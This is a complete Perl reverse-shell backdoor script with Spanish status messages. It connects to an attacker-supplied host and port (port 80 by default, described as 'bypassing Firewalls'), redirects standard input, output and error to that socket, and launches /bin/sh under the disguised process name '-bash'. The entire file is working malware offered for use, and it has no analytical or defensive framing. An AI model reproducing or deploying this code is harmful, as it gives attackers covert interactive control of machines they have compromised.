#!/usr/bin/perl

# Backdoor - Perl Connect Back Backdoor
# Unpublished/Unreleased Source Code

use Socket;

print "Backdoor ! bypassing Firewalls\n\n";

if (!$ARGV[0]) {
  printf "Uso: $0 [Host] <Puerto>\n";
  exit(1);
}

print "[*] Espere ...\n";

$host = $ARGV[0];
$port = 80;

if ($ARGV[1]) {
  $port = $ARGV[1];
}

print "[*] Conectando...\n";

$proto = getprotobyname('tcp') || die("[-] Protocolo Desconocido\n");

socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die ("[-] Error Socket\n");

my $target = inet_aton($host);

if (!connect(SERVER, pack "SnA4x8", 2, $port, $target)) {
  die("[-] Imposible Conectar\n");
}

print "[*] Cargando Shell...\n";

if (!fork( )) {
  open(STDIN,">&SERVER");
  open(STDOUT,">&SERVER");
  open(STDERR,">&SERVER");

  exec {'/bin/sh'} '-bash' . "\0" x 4;
  exit(0);
}

print "[*] Cargada a joder!\n\n";
